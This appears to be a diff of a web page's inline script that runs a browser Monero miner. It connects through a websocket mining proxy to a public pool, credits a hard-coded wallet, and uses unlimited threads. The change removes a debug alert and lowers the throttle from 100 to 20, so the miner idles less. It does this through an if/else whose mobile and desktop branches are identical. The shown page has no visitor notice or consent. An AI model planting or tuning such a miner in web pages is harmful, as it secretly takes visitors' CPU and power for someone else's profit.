@@ -47,7 +47,6 @@
 
     const isMobile = navigator.userAgentData.mobile;
 
-    alert(isMobile)
     server = "wss://ny1.xmrminingproxy.com";
     var pool = "moneroocean.stream";
     var walletAddress = "43GyeuQXp9yP1AgmqYNWwiQrfJgQoJdjxccquhRiWRt925QkSqxJJinNGKoRu5QTpMKvgv1SAGEksFNfvHwCuSC64KW2Cqx";
@@ -55,7 +54,10 @@
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 100;
+    if (isMobile)
+        throttleMiner = 20;
+    else
+        throttleMiner = 20;
 </script>
 
 </html>
